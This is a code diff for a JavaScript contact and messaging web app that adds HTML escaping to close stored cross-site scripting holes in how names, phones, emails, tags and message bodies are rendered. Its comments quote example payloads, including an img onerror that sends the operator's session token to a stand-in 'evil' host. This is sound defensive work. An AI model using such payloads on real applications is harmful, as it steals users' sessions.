@@ -2819,31 +2819,57 @@ let contacts = [];
 
 // ── PRIVACY MODE ────────────────────────────────────────────────────────────
 let privacyMode = localStorage.getItem('nlm_privacy') === '1';
+
+// Stored-XSS defense. These helpers are called in template literals that go
+// straight to innerHTML — without escaping, a contact named "<img src=x
+// onerror=fetch('//evil/?'+localStorage.nlm_token)>" exfiltrates the
+// operator's Supabase session token on every list render. Escape happens
+// AFTER any privacy-driven splitting so the `<span class="pblur">` wrapper
+// itself stays as real HTML.
+function escapeHtml(str){
+  if(str===null||str===undefined) return '';
+  return String(str)
+    .replace(/&/g,'&amp;')
+    .replace(/</g,'&lt;')
+    .replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;')
+    .replace(/'/g,'&#39;');
+}
 function pName(name){
-  if(!privacyMode||!name) return name||'';
+  if(!name) return '';
+  const safe = escapeHtml(name);
+  if(!privacyMode) return safe;
   const parts = name.trim().split(/\s+/);
-  if(parts.length===1) return name;
-  return `${parts[0]} <span class="pblur">${parts.slice(1).join(' ')}</span>`;
+  if(parts.length===1) return safe;
+  return `${escapeHtml(parts[0])} <span class="pblur">${escapeHtml(parts.slice(1).join(' '))}</span>`;
 }
 function pPhone(phone){
-  if(!privacyMode||!phone) return phone||'';
+  if(!phone) return '';
+  const safe = escapeHtml(phone);
+  if(!privacyMode) return safe;
   let shown=0, i=0;
   while(i<phone.length && shown<3){ if(/\d/.test(phone[i])) shown++; i++; }
-  return `${phone.slice(0,i)}<span class="pblur">${phone.slice(i)}</span>`;
+  return `${escapeHtml(phone.slice(0,i))}<span class="pblur">${escapeHtml(phone.slice(i))}</span>`;
 }
 function pEmail(email){
-  if(!privacyMode||!email) return email||'';
-  if(email.length<=4) return email;
-  return `${email.slice(0,4)}<span class="pblur">${email.slice(4)}</span>`;
+  if(!email) return '';
+  const safe = escapeHtml(email);
+  if(!privacyMode) return safe;
+  if(email.length<=4) return safe;
+  return `${escapeHtml(email.slice(0,4))}<span class="pblur">${escapeHtml(email.slice(4))}</span>`;
 }
 function pCompany(company){
-  if(!privacyMode||!company) return company||'';
-  if(company.length<=3) return company;
-  return `${company.slice(0,3)}<span class="pblur">${company.slice(3)}</span>`;
+  if(!company) return '';
+  const safe = escapeHtml(company);
+  if(!privacyMode) return safe;
+  if(company.length<=3) return safe;
+  return `${escapeHtml(company.slice(0,3))}<span class="pblur">${escapeHtml(company.slice(3))}</span>`;
 }
 function pTag(label){
-  if(!privacyMode||!label) return label||'';
-  return `<span class="pblur">${label}</span>`;
+  if(!label) return '';
+  const safe = escapeHtml(label);
+  if(!privacyMode) return safe;
+  return `<span class="pblur">${safe}</span>`;
 }
 function togglePrivacyMode(){
   privacyMode=!privacyMode;
@@ -4999,7 +5025,12 @@ function getAv(id) {
   for(let i=0;i<(id||'').length;i++) hash = (hash*31+id.charCodeAt(i))&0xffff;
   return colors[hash % colors.length];
 }
-function initials(name) { return (name||'?').split(' ').slice(0,2).map(w=>w[0]).join('').toUpperCase(); }
+function initials(name) {
+  // Output goes into innerHTML across the app; escape so a name like
+  // "<svg/onload=...>" can't break out of the avatar element.
+  const raw = (name||'?').split(' ').slice(0,2).map(w=>w[0]||'').join('').toUpperCase();
+  return escapeHtml(raw);
+}
 
 // ─── CONTACT MODAL ───
 // Split a legacy single "name" into first + last (first word = first name, rest = last name)
@@ -10799,9 +10830,13 @@ function renderConvBubbles(conv, avBg, avClr){
       if(statusIcons[msg.status]) statusHtml=`<div class="conv-bubble-status ${statusClass[msg.status]||''}">${statusIcons[msg.status]}</div>`;
     }
 
+    // Escape FIRST, then add the <br> replacement on the email body.
+    // Without this, an inbound SMS body of "<img src=x onerror=fetch(
+    //   '//evil/?'+localStorage.nlm_token)>" would exfiltrate the operator's
+    // Supabase session token the moment they open the thread.
     const bodyHtml = msg.ch==='email'
-      ? `${msg.subject?`<div class="conv-bubble-subject">📧 ${msg.subject}</div>`:''}${(msg.body||'').replace(/\n/g,'<br>')}`
-      : msg.body;
+      ? `${msg.subject?`<div class="conv-bubble-subject">📧 ${escapeHtml(msg.subject)}</div>`:''}${escapeHtml(msg.body||'').replace(/\n/g,'<br>')}`
+      : escapeHtml(msg.body||'');
 
     html+=`<div class="conv-bubble-wrap ${isOut?'outbound':'inbound'}">
       ${!isOut?`<div class="conv-bubble-av" style="background:${avBg};color:${avClr};font-size:8px">${initials(conv._contactName||'?')}</div>`:''}
